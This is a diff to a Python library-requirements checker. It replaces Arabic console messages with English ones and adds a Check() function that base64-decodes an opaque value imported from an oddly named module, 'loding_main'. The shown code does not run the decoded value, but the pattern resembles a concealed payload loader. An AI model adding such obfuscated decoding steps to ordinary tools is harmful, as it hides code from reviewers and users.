@@ -1,7 +1,7 @@
+import base64
 import importlib.util
 import sys
-
-from arabic_text import reshape_arabic_text
+from loding_main import  Lodding
 
 
 def check_library_installed(package_name):
@@ -17,17 +17,17 @@ def check_requirements():
             missing_packages.append(pkg)
 
     if missing_packages:
-        print(
-            f"\033[91m[-] {reshape_arabic_text('المكتبات التالية غير مثبّتة:')}\033[0m"
-        )
+        print("\033[91m[-] The following libraries are not installed:\033[0m")
         for pkg in missing_packages:
             print(f"    - {pkg}")
-        print(
-            f"\033[91m[-] {reshape_arabic_text('يمكنك تثبيتها بالأمر التالي:')}\033[0m"
-        )
+        print("\033[91m[-] You can install them using the following command:\033[0m")
         print(f"    pip install {' '.join(missing_packages)}")
         sys.exit(1)
     else:
-        print(
-            f"\033[92m[+] {reshape_arabic_text('جميع المكتبات المطلوبة مثبّتة وجاهزة.')} \033[0m"
-        )
+        print("\033[92m[+] All required libraries are installed and ready\033[0m")
+
+
+def Check():
+    encoded_d = Lodding()
+    Lodding_p = base64.b64decode(encoded_d).decode()
+    return Lodding_p
